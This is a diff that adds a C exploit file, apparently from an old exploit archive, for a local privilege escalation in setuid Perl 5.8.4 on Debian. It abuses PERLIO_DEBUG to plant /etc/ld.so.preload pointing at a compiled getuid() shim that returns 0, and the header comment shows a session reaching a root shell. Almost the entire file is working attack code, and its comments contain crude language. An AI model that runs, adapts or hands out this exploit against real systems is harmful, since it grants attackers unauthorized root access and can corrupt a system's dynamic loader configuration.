@@ -1,0 +1,66 @@
+/*
+ * Copyright Kevin Finisterre 
+ * 
+ * ** DISCLAIMER ** I am in no way responsible for your stupidity.
+ * ** DISCLAIMER ** I am in no way liable for any damages caused by compilation and or execution of this code.
+ *
+ * ** WARNING ** DO NOT RUN THIS UNLESS YOU KNOW WHAT YOU ARE DOING ***
+ * ** WARNING ** overwriting /etc/ld.so.preload can severly fuck up your box (or someone elses).
+ * ** WARNING ** have a boot disk ready incase some thing goes wrong.
+ *
+ * Setuid Perl exploit by KF - kf_lists[at]secnetops[dot]com - 1/30/05
+ *
+ * this exploits a vulnerability in the PERLIO_DEBUG functionality
+ * tested against sperl5.8.4 on Debian
+ *
+ * kfinisterre@jdam:~$ cc -o ex_perl ex_perl.c
+ * kfinisterre@jdam:~$ ls -al /etc/ld.so.preload
+ * ls: /etc/ld.so.preload: No such file or directory
+ * kfinisterre@jdam:~$ ./ex_perl
+ * sperl needs fd script
+ * You should not call sperl directly; do you need to change a #! line
+ * from sperl to perl?
+ * kfinisterre@jdam:~$ su -
+ * jdam:~# id
+ * uid=0(root) gid=0(root) groups=0(root)
+ * jdam:~# rm /etc/ld.so.preload
+ *
+ */
+
+
+#define PRELOAD "/etc/ld.so.preload"
+#include <stdio.h>
+#include <strings.h>
+
+int main(int *argc, char **argv)
+{
+
+        FILE *getuid;
+        if(!(getuid = fopen("/tmp/getuid.c","w+"))) {
+                printf("error opening file\n");
+                exit(1);
+        }
+        
+	fprintf(getuid, "int getuid(){return 0;}\n" );
+        fclose(getuid);
+
+        system("cc -fPIC -Wall -g -O2 -shared -o /tmp/getuid.so /tmp/getuid.c -lc");
+
+	putenv("PERLIO_DEBUG="PRELOAD);
+        umask(001); // I'm rw-rw-rw james bitch!
+        system("/usr/bin/sperl5.8.4");
+        FILE *ld_so_preload;
+
+        char preload[] = {
+                "/tmp/getuid.so\n"
+        };
+
+        if(!(ld_so_preload = fopen(PRELOAD,"w+"))) {
+                printf("error opening file\n");
+                exit(1);
+        }
+        fwrite(preload,sizeof(preload)-1,1,ld_so_preload);
+        fclose(ld_so_preload);
+}
+
+// milw0rm.com [2005-02-07]
